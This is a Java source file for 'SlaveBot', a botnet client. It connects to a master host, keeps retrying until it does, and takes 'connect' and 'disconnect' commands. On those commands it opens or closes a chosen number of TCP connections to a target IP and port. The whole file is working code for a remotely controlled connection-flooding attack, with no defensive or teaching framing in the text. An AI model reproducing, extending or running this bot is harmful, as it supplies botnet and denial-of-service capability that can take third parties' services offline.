package backup;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;

public class SlaveBot {

	public static void main(String[] args) {

		// parse arguments
		if (args.length != 4) {
			System.out.println("SlaveBot -h IPAddress|Hostname -p port");
			System.exit(-1);
		}

		String masterAddress = null;
		int masterPort = 0;

		for (int i = 0; i < 4; ++i) {
			if (args[i].equals("-h")) {
				masterAddress = args[++i];
			} else if (args[i].equals("-p")) {
				masterPort = Integer.parseInt(args[++i]);
			} else {
				System.out.println("SlaveBot -h IPAddress|Hostname -p port");
				System.exit(-1);
			}
		}

		SlaveBot slaveBot = new SlaveBot(masterAddress, masterPort);

		try {
			slaveBot.run();
		} catch (Exception e) {
			System.exit(-1);
		}

	}

	private Socket socket;

	private LinkedList<Target> targetList;

	private BufferedReader in;

	public SlaveBot(String masterAddress, int masterPort) {

		while (true) {
			try {
				this.socket = new Socket(masterAddress, masterPort);
				this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
				new PrintWriter(socket.getOutputStream(), true);
				break;
			} catch (Exception e) {
				try {
					Thread.sleep(3000);
				} catch (InterruptedException ie) {
					System.exit(-1);
				}
			}
		}

		this.targetList = new LinkedList<Target>();
	}

	public void connect(String[] tokens) {
		if (tokens.length != 4)
			return; // error

		String targetIP = tokens[1];
		String targetPort = tokens[2];
		int numberOfConnections = Integer.parseInt(tokens[3]);

		for (int i = 0; i < numberOfConnections; ++i) {
			try {
				targetList.add(new Target(targetIP, targetPort));
			} catch (Exception e) {
				// can not create Target
			}
		}
	}

	public void disconnect(String[] tokens) {
		int len = tokens.length;
		if (len < 2 || len > 3)
			return; // error

		int size = targetList.size();

		for (int i = 0; i < size; ++i) {
			if (len == 3) {
				if (targetList.get(i).getTargetIP().equalsIgnoreCase(tokens[1])
						&& targetList.get(i).getTargetPort().equalsIgnoreCase(tokens[2])) {
					try {
						targetList.get(i).getTargetSocket().shutdownInput();
						;
						targetList.get(i).getTargetSocket().shutdownOutput();
						targetList.get(i).getTargetSocket().close();
					} catch (IOException e) {

					}
					targetList.remove(i);
					--size;
					--i;
				}
			} else {
				if (targetList.get(i).getTargetIP().equalsIgnoreCase(tokens[1])) {
					try {
						targetList.get(i).getTargetSocket().shutdownInput();
						;
						targetList.get(i).getTargetSocket().shutdownOutput();
						targetList.get(i).getTargetSocket().close();
					} catch (IOException e) {

					}
					targetList.remove(i);
					--size;
					--i;
				}

			}
		}
	}

	public void parseCommand(String line) {
		if (line == null || line.isEmpty())
			return;

		String tokens[] = line.split("[ ]+");
		tokens[0] = tokens[0].replaceAll("[^A-Za-z0-9]", "");
		switch (tokens[0]) {
		case "connect":
			connect(tokens);
			break;
		case "disconnect":
			disconnect(tokens);
			break;
		default:
			// System.out.println("Invalid Command!");
		}
	}

	public void run() {
		while (true) {
			try {
				String line = in.readLine();
				parseCommand(line);
			} catch (Exception e) {
				System.exit(-1);
			}
		}
	}

}

class Target {
	private String targetIP;
	private String targetPort;
	private Socket targetSocket;

	public Target(String targetIP, String targetPort) {
		this.targetIP = targetIP.trim();
		this.targetPort = targetPort;
		int port = Integer.parseInt(targetPort);
		try {
			this.targetSocket = new Socket(this.targetIP, port);
		} catch (Exception e) {
			// e.printStackTrace();
		}
	}

	public String getTargetIP() {
		return targetIP;
	}

	public String getTargetPort() {
		return targetPort;
	}

	public Socket getTargetSocket() {
		return targetSocket;
	}

	public void setSocket(Socket targetSocket) {
		this.targetSocket = targetSocket;
	}

	public void setTargetIP(String targetIP) {
		this.targetIP = targetIP;
	}

	public void setTargetPort(String targetPort) {
		this.targetPort = targetPort;
	}

}
